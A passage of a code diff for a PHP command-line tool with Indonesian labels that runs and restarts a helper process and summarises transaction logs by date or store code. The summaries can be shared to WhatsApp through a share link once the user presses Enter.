+    stream_set_blocking($pipes[2], false);
+    stream_set_blocking(STDIN, false);
+
+    echo Warna::BOLD_HIJAU . "\n=== GAS JASDER ===" . Warna::RESET . "\n";
+    echo Warna::BOLD_CYAN . "Restart ke-#$restartCount\n" . Warna::RESET;
+    echo Warna::KUNING . "Ctrl+C untuk restart process\n" . Warna::RESET;
+
+    $running = true;
+
+    while ($running) {
+      $status = proc_get_status($process);
+      if (!$status['running']) {
+        $running = false;
+        break;
+      }
+
+      $input = fgets(STDIN);
+      if ($input !== false) {
+        $input = trim($input);
+        if ($input === 'quit' || $input === 'exit') {
+          $running = false;
+          break;
+        }
+        fwrite($pipes[0], $input . "\n");
+      }
+
+      $output = '';
+      while (($chunk = fread($pipes[1], 8192)) !== false && strlen($chunk) > 0) {
+        $output .= $chunk;
+      }
+      if (!empty($output)) {
+        echo $output;
+      }
+
+      $error = '';
+      while (($chunk = fread($pipes[2], 8192)) !== false && strlen($chunk) > 0) {
+        $error .= $chunk;
+      }
+      if (!empty($error)) {
+        echo Warna::BOLD_MERAH . $error . Warna::RESET;
+      }
+
+      usleep(100000);
+    }
+
+    @fclose($pipes[0]);
+    @fclose($pipes[1]);
+    @fclose($pipes[2]);
+    @proc_close($process);
+
+    if (isset($input) && ($input === 'quit' || $input === 'exit')) {
+      break;
+    }
+
+    echo Warna::BOLD_KUNING . "\n🔄 Restart dalam 2 detik...\n" . Warna::RESET;
+    echo Warna::KUNING . "Ctrl+C untuk membatalkan restart\n" . Warna::RESET;
+
+    $sleepTime = 2;
+    $interrupted = false;
+    while ($sleepTime > 0) {
+      if (fgets(STDIN) !== false) {
+        $interrupted = true;
+        break;
+      }
+      sleep(1);
+      $sleepTime--;
+    }
+
+    if ($interrupted) {
+      break;
+    }
+  }
+
+  if ($restartCount >= $maxRestarts) {
+    echo Warna::BOLD_MERAH . "\n✗ Maksimum restart tercapai\n" . Warna::RESET;
+  }
+
+  return;
+}
+
+/*===========================================
+                 COMMAND FUNCTIONS
+===========================================*/
+function jalankanKlik($inputs) {
+  $GREEN = "\033[1;32m";
+  $RED = "\033[1;31m";
+  $CYAN = "\033[1;36m";
+  $RESET = "\033[0m";
+
+  $cmd = 'script -q -c klik /dev/null';
+  $desc = [
+    0 => ["pipe",
+      "r"],
+    1 => ["pipe",
+      "w"],
+    2 => ["pipe",
+      "w"]
+  ];
+
+  $proc = proc_open($cmd, $desc, $pipes);
+
+  if (!is_resource($proc)) {
+    echo $RED . "\nGagal menjalankan klik!\n" . $RESET;
+    sleep(3);
+    return;
+  }
+
+  stream_set_blocking($pipes[1], false);
+  stream_set_blocking($pipes[2], false);
+  stream_set_blocking(STDIN, false);
+
+  echo $GREEN . "\n=== MEMULAI PROSES ===\n" . $RESET;
+
+  foreach ($inputs as $index => $input) {
+    if ($input !== '') {
+      fwrite($pipes[0], $input . "\n");
+      echo $CYAN . ">";
+    } else {
+      fwrite($pipes[0], "\n");
+      echo $CYAN . "\nDone\n";
+    }
+    usleep(100000);
+  }
+
+  $running = true;
+
+  echo $GREEN . "\n=== MULAI MEMBACA OUTPUT ===\n" . $RESET;
+
+  while ($running) {
+    $status = proc_get_status($proc);
+    if (!$status['running']) {
+      $running = false;
+      break;
+    }
+
+    $in = fgets(STDIN);
+    if ($in !== false) {
+      $in = trim($in);
+      if ($in == 'quit' || $in == 'exit' || $in == 'cancel') {
+        echo $RED . "\n\nProses dibatalkan oleh user\n" . $RESET;
+        fwrite($pipes[0], "\003");
+        break;
+      }
+      fwrite($pipes[0], $in . "\n");
+    }
+
+    $out = fread($pipes[1], 4096);
+    if ($out) {
+      echo $out;
+    }
+
+    $err = fread($pipes[2], 4096);
+    if ($err) {
+      echo $RED . $err . $RESET;
+    }
+
+    usleep(50000);
+  }
+
+  fclose($pipes[0]);
+  fclose($pipes[1]);
+  fclose($pipes[2]);
+  proc_close($proc);
+
+  echo $GREEN . "\n\n=== PROSES SELESAI ===\n" . $RESET;
+
+  die;
+}
+
+
+
+function kirimKeWhatsApp($pesan, $dataindex = null) {
+  if (empty(trim($pesan))) {
+    echo Warna::BOLD_MERAH . "\n✗ Tidak ada data yang akan dikirim\n" . Warna::RESET;
+    return;
+  }
+
+  $pesanEncoded = urlencode($pesan);
+  $whatsappUrl = "https://wa.me/?text=$pesanEncoded";
+  if ($dataindex) {
+    echo "\n 👉 $dataindex\n";
+    echo Warna::BOLD_KUNING. "↗ Tekan Enter Untuk Mengirim data ke WhatsApp " . Warna::RESET;
+    fgets(STDIN);
+  } else {
+    echo Warna::BOLD_KUNING . "\n↗ Tekan Enter Mengirim data ke WhatsApp... " . Warna::RESET;
+    fgets(STDIN);
+  }
+
+  if (PHP_OS_FAMILY === 'Linux') {
+    exec("am start -a android.intent.action.VIEW -d '$whatsappUrl' 2>/dev/null");
+  } elseif (PHP_OS_FAMILY === 'Windows') {
+    exec("start $whatsappUrl");
+  } elseif (PHP_OS_FAMILY === 'Darwin') {
+    exec("open '$whatsappUrl'");
+  } else {
+    echo Warna::BOLD_CYAN . "🔗 Buka manual: $whatsappUrl\n" . Warna::RESET;
+  }
+
+  echo Warna::BOLD_HIJAU . "✓ Data berhasil dibuka di WhatsApp\n" . Warna::RESET;
+}
+
+/*===========================================
+                 REKAP PIN
+===========================================*/
+function rekappin() {
+  echo "\033[92;1m
+           ▄▄█▀██▀█▄▄▄▄
+         ▄█▀▀████▄▄█▀▀▀▀█▄▄
+       ▄█                  █▄
+     ▄██                    ▀█▄
+    ▄██                       ██
+    █▀        ▄          ▄     ▀█▄
+   █▀    ▄▀▀▀▀ █     ▄▀▀▀ ▀▄     █▄
+  ██    █ ▄▀▀▄ █    █ ▄▀▀▄  █    ██
+ ██     █  ▀▀ ▄▀    ▀▄ ▀▀  ▄▀     █
+██▀     ▀▀▀▀▀▀        ▀▀▀▀▀       █
+██             ▐                  █
+█▀             ▌    ▌             █
+█             ▐ ▄ ▄ ▐             █
+█        ▐                        █
+█        ▌                       ██
+█       ▐  ▄▀▀▀▀▀▀▀▀▄            ██
+ █       ▄▀▄████████▄█▄ ▌       ██
+  █      █▄█▄▄█▄▄█▄▄██▀ ▐     ▄██
+  ▀▄      ▀█▄▄▄▄▄▄▄▄▀       ▄█▀
+    █▄  ▀▄                ▄█▀
+     █▄▄  ▀             ▄█▀
+       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
+                                   \n";
+
+  $lines = bacaSemuaFilePin();
+  $transaksi = [];
+  $id_trx_seen = [];
+
+  foreach ($lines as $line) {
+    $line = trim($line);
+    if (empty($line)) continue;
+
+    $trx = [];
+
+    if (preg_match('/NOMOR:\s*(\d+)/', $line, $match)) $trx['nomor'] = $match[1];
+    if (preg_match('/ID_TRX:\s*(\S+)/', $line, $match)) $trx['id_trx'] = $match[1];
+
+    if (!empty($trx['id_trx'])) {
+      if (isset($id_trx_seen[$trx['id_trx']])) {
+        continue;
+      }
+      $id_trx_seen[$trx['id_trx']] = true;
+    }
+
+    if (preg_match('/KODE TOKO:\s*(.+?)\s+PRODUK:/', $line, $match)) {
+      $trx['kode_toko'] = trim($match[1]);
+      if (preg_match('/\(([A-Z0-9]{4})\)/', $trx['kode_toko'], $kode_match)) {
+        $trx['kode_singkat'] = $kode_match[1];
+      }
+    }
+
+    if (preg_match('/PRODUK:\s*(.+?)\s+WAKTU:/', $line, $match)) {
+      $produk_str = trim($match[1]);
+      $produk_items = [];
+
+      $pattern = '/(.+?)\s+Qty:\s*(\d+)/';
+      if (preg_match_all($pattern, $produk_str, $matches, PREG_SET_ORDER)) {
+        foreach ($matches as $match) {
+          $produk_items[] = [
+            'nama' => trim($match[1]),
+            'qty' => (int)$match[2]
+          ];
+        }
+      }
+      $trx['produk'] = $produk_items;
+    }
+
+    if (preg_match('/WAKTU:\s*([\d\-T:.]+Z)/', $line, $match)) {
+      $trx['waktu'] = $match[1];
+      $trx['tanggal'] = substr($match[1], 0, 10);
+    }
+
+    if (preg_match('/BARCODE:\s*(https?:\/\/\S+)/', $line, $match)) $trx['barcode'] = $match[1];
+
+    if (!empty($trx['id_trx'])) {
+      $transaksi[] = $trx;
+    }
+  }
+
+  echo Warna::BOLD_HIJAU . "✓ ID_TRX ditemukan: " . count($transaksi) . " transaksi\n\n" . Warna::RESET;
+
+  echo Warna::BOLD_CYAN . "📱 PILIH MODE:\n" . Warna::RESET;
+  echo Warna::KUNING . "1. Rekap berdasarkan rentang tanggal\n";
+  echo "2. Filter berdasarkan kode toko\n";
+  echo Warna::BOLD_PUTIH . "Pilihan: " . Warna::RESET;
+  $pilihan = trim(fgets(STDIN));
+
+
+
+  function parseTanggalInput($input_tanggal, $sebagai_awal = true) {
+    if (empty($input_tanggal)) {
+      return ['tanggal' => '',
+        'jam' => '',
+        'full' => ''];
+    }
+
+    $tahun_bulan = date('Y-m');
+    $jam_default = $sebagai_awal ? '00:00:00' : '23:59:59';
+
+    if (preg_match('/^(\d{1,2})\s+(\d{1,2})(?::(\d{1,2}))?(?::(\d{1,2}))?$/', $input_tanggal, $match)) {
+      $tanggal = str_pad($match[1], 2, '0', STR_PAD_LEFT);
+      $jam = str_pad($match[2], 2, '0', STR_PAD_LEFT);
+      $menit = isset($match[3]) ? str_pad($match[3], 2, '0', STR_PAD_LEFT) : '00';
+      $detik = isset($match[4]) ? str_pad($match[4], 2, '0', STR_PAD_LEFT) : '00';
+
+      return [
+        'tanggal' => $tahun_bulan . '-' . $tanggal,
+        'jam' => $jam . ':' . $menit . ':' . $detik,
+        'full' => $tahun_bulan . '-' . $tanggal . 'T' . $jam . ':' . $menit . ':' . $detik . 'Z'
+      ];
+    } elseif (is_numeric($input_tanggal) && $input_tanggal >= 1 && $input_tanggal <= 31) {
+      $tanggal = str_pad($input_tanggal, 2, '0', STR_PAD_LEFT);
+      return [
+        'tanggal' => $tahun_bulan . '-' . $tanggal,
+        'jam' => $jam_default,
+        'full' => $tahun_bulan . '-' . $tanggal . 'T' . $jam_default . 'Z'
+      ];
+    } elseif (preg_match('/^(\d{4}-\d{2}-\d{2})\s+(\d{1,2}):(\d{1,2}):(\d{1,2})$/', $input_tanggal, $match)) {
+      $jam = str_pad($match[2], 2, '0', STR_PAD_LEFT);
+      $menit = str_pad($match[3], 2, '0', STR_PAD_LEFT);
+      $detik = str_pad($match[4], 2, '0', STR_PAD_LEFT);
+
+      return [
+        'tanggal' => $match[1],
+        'jam' => $jam . ':' . $menit . ':' . $detik,
+        'full' => $match[1] . 'T' . $jam . ':' . $menit . ':' . $detik . 'Z'
+      ];
+    } elseif (preg_match('/^(\d{4}-\d{2}-\d{2})\s+(\d{1,2}):(\d{1,2})$/', $input_tanggal, $match)) {
+      $jam = str_pad($match[2], 2, '0', STR_PAD_LEFT);
+      $menit = str_pad($match[3], 2, '0', STR_PAD_LEFT);
+
+      return [
+        'tanggal' => $match[1],
+        'jam' => $jam . ':' . $menit . ':00',
+        'full' => $match[1] . 'T' . $jam . ':' . $menit . ':00Z'
+      ];
+    } elseif (preg_match('/^(\d{4}-\d{2}-\d{2})\s+(\d{1,2})$/', $input_tanggal, $match)) {
+      $jam = str_pad($match[2], 2, '0', STR_PAD_LEFT);
+
+      return [
+        'tanggal' => $match[1],
+        'jam' => $jam . ':00:00',
+        'full' => $match[1] . 'T' . $jam . ':00:00Z'
+      ];
+    } elseif (preg_match('/^\d{4}-\d{2}-\d{2}$/', $input_tanggal)) {
+      return [
+        'tanggal' => $input_tanggal,
+        'jam' => $jam_default,
+        'full' => $input_tanggal . 'T' . $jam_default . 'Z'
+      ];
+    } else {
+      return [
+        'tanggal' => '',
+        'jam' => '',
+        'full' => ''
+      ];
+    }
+  }
+
+  if ($pilihan == '1') {
+    echo Warna::BOLD_CYAN . "\n📅 REKAP BERDASARKAN TANGGAL\n" . Warna::RESET;
+    echo Warna::KUNING . "Format:\n";
+    echo "  - Tanggal saja (1-31) -> 05\n";
+    echo "  - Tanggal + Jam -> 05 13 atau 05 13:30\n";
+    echo "  - Format lengkap -> 2024-01-05 13:30:00\n";
+    echo "  - Kosong = semua data\n" . Warna::RESET;
+
+    echo Warna::PUTIH . "Tanggal awal (kosong=semua): " . Warna::RESET;
+    $tgl1_input = trim(fgets(STDIN));
+    echo Warna::PUTIH . "Tanggal akhir (kosong=semua): " . Warna::RESET;
+    $tgl2_input = trim(fgets(STDIN));
+
+    $tgl1_data = parseTanggalInput($tgl1_input, true);
+    $tgl2_data = parseTanggalInput($tgl2_input, false);
+
+    if (!empty($tgl1_input) && empty($tgl1_data['tanggal'])) {
+      echo Warna::BOLD_MERAH . "✗ Format tanggal awal tidak valid\n" . Warna::RESET;
+      exit;
+    }
+    if (!empty($tgl2_input) && empty($tgl2_data['tanggal'])) {
+      echo Warna::BOLD_MERAH . "✗ Format tanggal akhir tidak valid\n" . Warna::RESET;
+      exit;
+    }
+
+    if (!empty($tgl1_data['tanggal'])) {
+      echo Warna::HIJAU . "   → Tanggal awal: " . $tgl1_data['tanggal'] .
+      ($tgl1_data['jam'] !== '00:00:00' ? " jam " . $tgl1_data['jam'] : "") . "\n" . Warna::RESET;
+    }
+    if (!empty($tgl2_data['tanggal'])) {
+      echo Warna::HIJAU . "   → Tanggal akhir: " . $tgl2_data['tanggal'] .
+      ($tgl2_data['jam'] !== '23:59:59' ? " jam " . $tgl2_data['jam'] : "") . "\n" . Warna::RESET;
+    }
+
+    $filtered = [];
+    foreach ($transaksi as $trx) {
+      if (!isset($trx['waktu'])) continue;
+
+      $waktu = $trx['waktu'];
+      $ok = true;
+
+      if (!empty($tgl1_data['full']) && $waktu < $tgl1_data['full']) $ok = false;
+      if (!empty($tgl2_data['full']) && $waktu > $tgl2_data['full']) $ok = false;
+
+      if ($ok) $filtered[] = $trx;
+    }
+
+    if (empty($filtered)) {
+      echo Warna::BOLD_MERAH . "✗ Tidak ada transaksi dalam rentang tanggal tersebut\n" . Warna::RESET;
+      exit;
+    }
+
+    $byToko = [];
+    foreach ($filtered as $trx) {
+      $toko = $trx['kode_toko'] ?? 'UNKNOWN';
+      $tgl = $trx['tanggal'] ?? 'UNKNOWN';
+
+      if (!isset($byToko[$toko])) $byToko[$toko] = [];
+      if (!isset($byToko[$toko][$tgl])) $byToko[$toko][$tgl] = [];
+
+      $byToko[$toko][$tgl][] = $trx;
+    }
+
+    $totalAll = ['transaksi' => 0,
+      'produk' => 0,
+      'item' => 0,
+      'detail' => [],
+      'toko' => 0];
+
+    echo Warna::BOLD_HIJAU . "\n" . str_repeat("═", 60) . "\n";
+    echo "📊 SUMMARY ALL DATA\n";
+    echo str_repeat("═", 60) . "\n" . Warna::RESET;
+
+    foreach ($filtered as $trx) {
+      $totalAll['transaksi']++;
+      $totalAll['produk'] += count($trx['produk'] ?? []);
+
+      foreach ($trx['produk'] ?? [] as $p) {
+        $totalAll['item'] += $p['qty'];
+        $nama = $p['nama'];
+        @$totalAll['detail'][$nama] += $p['qty'];
+      }
+    }
+    $totalAll['toko'] = count($byToko);
+
+    echo Warna::BOLD_CYAN . "   Total Transaksi : " . $totalAll['transaksi'] . "\n" . Warna::RESET;
+    echo Warna::BOLD_HIJAU . "   Total Produk    : " . $totalAll['produk'] . "\n" . Warna::RESET;
+    echo Warna::BOLD_KUNING . "   Total Toko     : " . $totalAll['toko'] . "\n" . Warna::RESET;
+    echo Warna::BOLD_MAGENTA . "   Total Item      : " . $totalAll['item'] . "\n" . Warna::RESET;
+
+    if (!empty($totalAll['detail'])) {
+      echo Warna::BOLD_PUTIH . "   Detail Item:\n" . Warna::RESET;
+      foreach ($totalAll['detail'] as $nama => $qty) {
+        $nama_pendek = strlen($nama) > 65 ? substr($nama, 0, 65) . "" : $nama;
+        echo Warna::PUTIH . "     " . str_pad($qty, 3) . " x $nama_pendek\n" . Warna::RESET;
+      }
+    }
+    echo Warna::BOLD_HIJAU . str_repeat("═", 60) . "\n\n" . Warna::RESET;
+
+    echo Warna::PUTIH . "\nKirim ke WhatsApp? (y/n): " . Warna::RESET;
+    $kirim_wa = trim(fgets(STDIN));
+
+    $index = 1;
+    foreach ($byToko as $toko => $tglGroup) {
+      $dataindex = "\033[96;1m " . $index . " / " . count($byToko) . "\033[97;1m Toko : $toko \033[93;1m";
+      $index++;
+
+      $pesanToko = "KODE TOKO: $toko\n";
+      $pesanToko .= str_repeat("-", 50) . "\n";
+
+      $totalToko = ['transaksi' => 0,
+        'produk' => 0,
+        'item' => 0,
+        'detail' => []];
+
+      $jumlahTanggal = count($tglGroup);
+
+      foreach ($tglGroup as $tgl => $trxList) {
+        $pesanToko .= "\nTanggal: $tgl\n\n";
+
+        $totalTgl = ['transaksi' => 0,
+          'produk' => 0,
+          'item' => 0,
+          'detail' => []];
+
+        foreach ($trxList as $i => $trx) {
+          $no = $i + 1;
+          $pesanToko .= "Transaksi $no:\n";
+          $pesanToko .= "  ID_TRX  : " . ($trx['id_trx'] ?? '-') . "\n";
+          $pesanToko .= "  Barcode : " . ($trx['barcode'] ?? '-') . "\n\n";
+
+          foreach ($trx['produk'] ?? [] as $p) {
+            $totalTgl['item'] += $p['qty'];
+            $totalToko['item'] += $p['qty'];
+
+            $nama = $p['nama'];
+            @$totalTgl['detail'][$nama] += $p['qty'];
+            @$totalToko['detail'][$nama] += $p['qty'];
+          }
+
+          $totalTgl['transaksi']++;
+          $totalTgl['produk'] += count($trx['produk'] ?? []);
+
+          $totalToko['transaksi']++;
+          $totalToko['produk'] += count($trx['produk'] ?? []);
+        }
+
+        if ($jumlahTanggal > 1) {
+          $pesanToko .= "Summary Tanggal $tgl:\n";
+          $pesanToko .= "  Total Transaksi : " . $totalTgl['transaksi'] . "\n";
+          $pesanToko .= "  Total Produk    : " . $totalTgl['produk'] . "\n";
+          $pesanToko .= "  Total Item      : " . $totalTgl['item'] . "\n";
+          if (!empty($totalTgl['detail'])) {
+            $pesanToko .= "  Detail Item:\n";
+            foreach ($totalTgl['detail'] as $nama => $qty) {
+              $pesanToko .= "    " . str_pad($qty, 3) . " x $nama\n";
+            }
+          }
+          $pesanToko .= "\n";
+        }
+      }
+
+      $pesanToko .= "Summary Kode Toko $toko:\n";
+      $pesanToko .= "  Total Transaksi : " . $totalToko['transaksi'] . "\n";
+      $pesanToko .= "  Total Produk    : " . $totalToko['produk'] . "\n";
+      $pesanToko .= "  Total Item      : " . $totalToko['item'] . "\n";
+      if (!empty($totalToko['detail'])) {
+        $pesanToko .= "  Detail Item:\n";
+        foreach ($totalToko['detail'] as $nama => $qty) {
+          $pesanToko .= "    " . str_pad($qty, 3) . " x $nama\n";
+        }
+      }
+      $pesanToko .= "\n" . str_repeat("=", 50);
+
+      if (strtolower($kirim_wa) == 'y') {
+        kirimKeWhatsApp(formatDenganBacktic($pesanToko), $dataindex);
+      }
+    }
+
+    $pesanTotal = "REKAP SUMMARY TOTAL\n";
+    $pesanTotal .= str_repeat("=", 50) . "\n";
+    $pesanTotal .= "Total Transaksi : " . $totalAll['transaksi'] . "\n";
+    $pesanTotal .= "Total Produk    : " . $totalAll['produk'] . "\n";
+    $pesanTotal .= "Total Toko      : " . $totalAll['toko'] . "\n";
+    $pesanTotal .= "Total Item      : " . $totalAll['item'] . "\n";
+    if (!empty($totalAll['detail'])) {
+      $pesanTotal .= "Detail Item:\n";
+      foreach ($totalAll['detail'] as $nama => $qty) {
+        $pesanTotal .= "  " . str_pad($qty, 3) . " x $nama\n";
+      }
+    }
+
+    if (strtolower($kirim_wa) == 'y') {
+      kirimKeWhatsApp(formatDenganBacktic($pesanTotal));
+    }
+
+  } elseif ($pilihan == '2') {
+    echo Warna::BOLD_CYAN . "\n🏪 FILTER BERDASARKAN KODE TOKO\n" . Warna::RESET;
+    echo Warna::PUTIH . "Masukkan 4 kode toko (dalam kurung): " . Warna::RESET;
+    $kodeCari = trim(fgets(STDIN));
+    $kodeCari = strtoupper($kodeCari);
+
+    echo Warna::KUNING . "Format:\n";
+    echo "  - Tanggal saja (1-31) -> 05\n";
+    echo "  - Tanggal + Jam -> 05 13 atau 05 13:30\n";
+    echo "  - Format lengkap -> 2024-01-05 13:30:00\n";
+    echo "  - Kosong = semua data\n" . Warna::RESET;
+
+    echo Warna::PUTIH . "Tanggal awal (kosong=semua): " . Warna::RESET;
+    $tgl1_input = trim(fgets(STDIN));
+    echo Warna::PUTIH . "Tanggal akhir (kosong=semua): " . Warna::RESET;
+    $tgl2_input = trim(fgets(STDIN));
+
+    $tgl1_data = parseTanggalInput($tgl1_input, true);
+    $tgl2_data = parseTanggalInput($tgl2_input, false);
+
+    if (!empty($tgl1_input) && empty($tgl1_data['tanggal'])) {
+      echo Warna::BOLD_MERAH . "✗ Format tanggal awal tidak valid\n" . Warna::RESET;
+      exit;
+    }
+    if (!empty($tgl2_input) && empty($tgl2_data['tanggal'])) {
+      echo Warna::BOLD_MERAH . "✗ Format tanggal akhir tidak valid\n" . Warna::RESET;
+      exit;
+    }
+
+    if (!empty($tgl1_data['tanggal'])) {
+      echo Warna::HIJAU . "   → Tanggal awal: " . $tgl1_data['tanggal'] .
+      ($tgl1_data['jam'] !== '00:00:00' ? " jam " . $tgl1_data['jam'] : "") . "\n" . Warna::RESET;
+    }
+    if (!empty($tgl2_data['tanggal'])) {
+      echo Warna::HIJAU . "   → Tanggal akhir: " . $tgl2_data['tanggal'] .
+      ($tgl2_data['jam'] !== '23:59:59' ? " jam " . $tgl2_data['jam'] : "") . "\n" . Warna::RESET;
+    }
+
+    echo Warna::PUTIH . "\nKirim ke WhatsApp? (y/n): " . Warna::RESET;
+    $kirim_wa = trim(fgets(STDIN));
+
+    $filtered = [];
+    foreach ($transaksi as $trx) {
+      $kode_singkat = $trx['kode_singkat'] ?? '';
+      if ($kode_singkat !== $kodeCari) continue;
+
+      if (!isset($trx['waktu'])) continue;
+
+      $waktu = $trx['waktu'];
+      $ok = true;
+
+      if (!empty($tgl1_data['full']) && $waktu < $tgl1_data['full']) $ok = false;
+      if (!empty($tgl2_data['full']) && $waktu > $tgl2_data['full']) $ok = false;
+
+      if ($ok) $filtered[] = $trx;
+    }
+
+    if (empty($filtered)) {
+      echo Warna::BOLD_MERAH . "✗ Tidak ada transaksi untuk kode toko '$kodeCari'\n" . Warna::RESET;
+      exit;
+    }
+
+    $byTgl = [];
+    foreach ($filtered as $trx) {
+      $tgl = $trx['tanggal'] ?? 'UNKNOWN';
+      if (!isset($byTgl[$tgl])) $byTgl[$tgl] = [];
+      $byTgl[$tgl][] = $trx;
+    }
+
+    $nama_toko = $filtered[0]['kode_toko'] ?? $kodeCari;
+    $jumlahTanggal = count($byTgl);
+
+    $totalAll = ['transaksi' => 0,
+      'produk' => 0,
+      'item' => 0,
+      'detail' => []];
+
+    echo Warna::BOLD_HIJAU . "\n" . str_repeat("═", 60) . "\n";
+    echo "📊 SUMMARY ALL DATA UNTUK TOKO $nama_toko\n";
+    echo str_repeat("═", 60) . "\n" . Warna::RESET;
+
+    foreach ($filtered as $trx) {
+      $totalAll['transaksi']++;
+      $totalAll['produk'] += count($trx['produk'] ?? []);
+
+      foreach ($trx['produk'] ?? [] as $p) {
+        $totalAll['item'] += $p['qty'];
+        $nama = $p['nama'];
+        @$totalAll['detail'][$nama] += $p['qty'];
+      }
+    }
+
+    echo Warna::BOLD_CYAN . "   Total Transaksi : " . $totalAll['transaksi'] . "\n" . Warna::RESET;
+    echo Warna::BOLD_HIJAU . "   Total Produk    : " . $totalAll['produk'] . "\n" . Warna::RESET;
+    echo Warna::BOLD_KUNING . "   Jumlah Tanggal : " . $jumlahTanggal . "\n" . Warna::RESET;
+    echo Warna::BOLD_MAGENTA . "   Total Item      : " . $totalAll['item'] . "\n" . Warna::RESET;
+
+    if (!empty($totalAll['detail'])) {
+      echo Warna::BOLD_PUTIH . "   Detail Item:\n" . Warna::RESET;
+      foreach ($totalAll['detail'] as $nama => $qty) {
+        $nama_pendek = strlen($nama) > 35 ? substr($nama, 0, 35) . "..." : $nama;
+        echo Warna::PUTIH . "     " . str_pad($qty, 3) . " x $nama_pendek\n" . Warna::RESET;
+      }
+    }
+    echo Warna::BOLD_HIJAU . str_repeat("═", 60) . "\n\n" . Warna::RESET;
+
+    $pesan = "Kode Toko: $nama_toko\n";
+    $pesan .= str_repeat("-", 50) . "\n";
+
+    if (!empty($tgl1_data['tanggal']) || !empty($tgl2_data['tanggal'])) {
+      $rentang = "Rentang: ";
+      if ($tgl1_data['tanggal']) {
+        $rentang .= $tgl1_data['tanggal'];
+        if ($tgl1_data['jam'] !== '00:00:00') {
+          $rentang .= " " . substr($tgl1_data['jam'], 0, 5);
+        }
+      } else {
+        $rentang .= "Semua";
+      }
+
+      $rentang .= " s/d ";
+
+      if ($tgl2_data['tanggal']) {
+        $rentang .= $tgl2_data['tanggal'];
+        if ($tgl2_data['jam'] !== '23:59:59') {
+          $rentang .= " " . substr($tgl2_data['jam'], 0, 5);
+        }
+      } else {
+        $rentang .= "Semua";
+      }
+
+      $pesan .= $rentang . "\n\n";
+    }
+
+    $allPesanTanggal = "";
+    foreach ($byTgl as $tgl => $trxList) {
+      $pesanTanggal = "Tanggal: $tgl\n";
+      $pesanTanggal .= str_repeat("-", 40) . "\n\n";
+
+      $totalTgl = ['transaksi' => 0,
+        'produk' => 0,
+        'item' => 0,
+        'detail' => []];
+
+      foreach ($trxList as $i => $trx) {
+        $no = $i + 1;
+        $pesanTanggal .= "Transaksi $no:\n";
+        $pesanTanggal .= "  ID_TRX  : " . ($trx['id_trx'] ?? '-') . "\n";
+        $pesanTanggal .= "  Barcode : " . ($trx['barcode'] ?? '-') . "\n\n";
+
+        foreach ($trx['produk'] ?? [] as $p) {
+          $totalTgl['item'] += $p['qty'];
+
+          $nama = $p['nama'];
+          @$totalTgl['detail'][$nama] += $p['qty'];
+        }
+
+        $totalTgl['transaksi']++;
+        $totalTgl['produk'] += count($trx['produk'] ?? []);
+      }
+
+      if ($jumlahTanggal > 1) {
+        $pesanTanggal .= "Summary Tanggal $tgl:\n";
+        $pesanTanggal .= "  Total Transaksi : " . $totalTgl['transaksi'] . "\n";
+        $pesanTanggal .= "  Total Produk    : " . $totalTgl['produk'] . "\n";
+        $pesanTanggal .= "  Total Item      : " . $totalTgl['item'] . "\n";
+        if (!empty($totalTgl['detail'])) {
+          $pesanTanggal .= "  Detail Item:\n";
+          foreach ($totalTgl['detail'] as $nama => $qty) {
+            $pesanTanggal .= "    " . str_pad($qty, 3) . " x $nama\n";
+          }
+        }
+        $pesanTanggal .= "\n" . str_repeat("=", 50) . "\n\n";
+      }
+
+      $allPesanTanggal .= $pesanTanggal;
+
+      if (strtolower($kirim_wa) == 'y' && $jumlahTanggal > 1) {
+        kirimKeWhatsApp(formatDenganBacktic($pesan . $pesanTanggal));
+        if (count($byTgl) > 1) {
+          echo Warna::BOLD_KUNING . "\n⏳ Tekan Enter untuk tanggal berikutnya..." . Warna::RESET;
+          fgets(STDIN);
+        }
+      }
+    }
+
+    $pesanTotal = "Summary Kode Toko $nama_toko:\n";
+    $pesanTotal .= "  Total Transaksi : " . $totalAll['transaksi'] . "\n";
+    $pesanTotal .= "  Total Produk    : " . $totalAll['produk'] . "\n";
+    $pesanTotal .= "  Total Item      : " . $totalAll['item'] . "\n";
+    if (!empty($totalAll['detail'])) {
+      $pesanTotal .= "  Detail Item:\n";
+      foreach ($totalAll['detail'] as $nama => $qty) {
+        $pesanTotal .= "    " . str_pad($qty, 3) . " x $nama\n";
+      }
+    }
+    $pesanTotal .= "\n" . str_repeat("=", 50);
+
+    if ($jumlahTanggal == 1) {
+      $pesanFinal = $pesan . $allPesanTanggal . $pesanTotal;
+    } else {
+      $pesanFinal = $pesan . $pesanTotal;
+    }
+
+    if (strtolower($kirim_wa) == 'y') {
+      if ($jumlahTanggal == 1) {
+        kirimKeWhatsApp(formatDenganBacktic($pesanFinal));
+      } else {
+        kirimKeWhatsApp(formatDenganBacktic($pesan . $pesanTotal));
+      }
+    }
+
+  } else {
+    echo Warna::BOLD_MERAH . "✗ Pilihan tidak valid!\n" . Warna::RESET;
+  }
+
+  echo Warna::BOLD_HIJAU . "\n✨ Program selesai.\n" . Warna::RESET;
+}
+
+function bacaSemuaFilePin($sources = [
+  'check_pin.txt',
+  'pesananxtra/',
+  'pinbanyak/'
+]) {
+  $uniqueLines = [];
+  $totalLines = 0;
+  $duplicateLines = 0;
+  $filesProcessed = [];
+
+  echo "\n" . Warna::BOLD_CYAN . "Memproses sumber data..." . Warna::RESET . "\n";
+
+  foreach ($sources as $source) {
+    if (is_file($source)) {
+      $lines = file($source, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+      $fileCount = count($lines);
+
+      echo Warna::CYAN . "✓ File: " . basename($source) . " (" . $fileCount . " baris)" . Warna::RESET . "\n";
+      $filesProcessed[] = $source;
+
+      foreach ($lines as $line) {
+        processLine($line, $uniqueLines, $totalLines, $duplicateLines);
+      }
+    } elseif (is_dir($source)) {
+      if (!is_dir($source)) {
+        echo Warna::KUNING . "⚠ Folder '" . $source . "' tidak ditemukan, melewati..." . Warna::RESET . "\n";
+        continue;
+      }
+
+      $files = glob($source . '*.txt');
+
+      if (empty($files)) {
+        echo Warna::KUNING . "⚠ Tidak ada file .txt di folder '" . $source . "'" . Warna::RESET . "\n";
+        continue;
+      }
+
+      echo Warna::HIJAU . "\n📁 Folder: " . $source . " (" . count($files) . " file)" . Warna::RESET . "\n";
+
+      foreach ($files as $file) {
+        $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        $fileCount = count($lines);
+
+        echo Warna::CYAN . "  → " . basename($file) . " (" . $fileCount . " baris)" . Warna::RESET . "\n";
+        $filesProcessed[] = $file;
+
+        foreach ($lines as $line) {
+          processLine($line, $uniqueLines, $totalLines, $duplicateLines);
